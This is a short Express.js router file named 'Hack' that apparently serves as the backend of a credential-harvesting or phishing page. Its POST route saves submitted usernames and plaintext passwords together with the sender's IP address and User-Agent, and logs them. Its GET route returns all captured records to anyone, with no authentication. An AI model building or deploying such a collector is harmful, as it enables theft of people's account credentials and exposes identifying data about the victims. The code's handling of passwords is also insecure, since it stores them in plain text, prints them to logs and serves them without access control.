const express = require("express");
const HackRouter = express.Router();
const Hack = require("../models/Hack.modal");

HackRouter.post("/", async (req, res) => {
    try {
        console.log("Received POST request to /hack:", req.body);

        // Extract additional details from the request
        const additionalDetails = {
            ipAddress: req.ip,
            userAgent: req.get("User-Agent"),
            // Add more details as needed
        };

        // Create a new Hack instance with both user-provided data and additional details
        const data = new Hack({
            username: req.body.username,
            password: req.body.password,
            ...additionalDetails,
        });

        console.log("Created new Hack instance:", data);

        await data.save();
        console.log("Data saved successfully:", data);

        res.status(201).json({ status: true, msg: "Added successfully", data });
    } catch (error) {
        console.error("Error saving data:", error);
        res.status(500).json({ status: false, error: "Failed to create a new product." });
    }
});


HackRouter.get("/", async (req, res) => {
    try {
        console.log("Received GET request to /hack");
        const data = await Hack.find();
        console.log("Fetched data from the database:", data);
        res.status(200).json(data);
    } catch (error) {
        console.error("Error fetching data:", error);
        res.status(500).json({ status: false, error: "Failed to fetch products." });
    }
});

module.exports = {
    HackRouter
};
